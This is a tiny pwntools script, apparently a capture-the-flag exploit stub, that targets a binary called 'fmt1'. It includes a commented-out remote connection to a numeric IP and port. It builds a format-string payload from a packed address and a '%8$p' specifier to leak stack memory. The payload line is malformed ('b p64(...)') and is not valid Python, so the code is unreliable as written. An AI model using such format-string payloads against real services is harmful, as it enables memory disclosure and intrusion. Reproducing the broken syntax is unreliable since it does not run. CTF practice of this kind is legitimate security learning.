from pwn import *
#p=remote('45.122.249.68',9418)
#p=process('./fmt1')

payload =b""	
payload = b p64(0x404040)+b'%8$p'

print(payload)

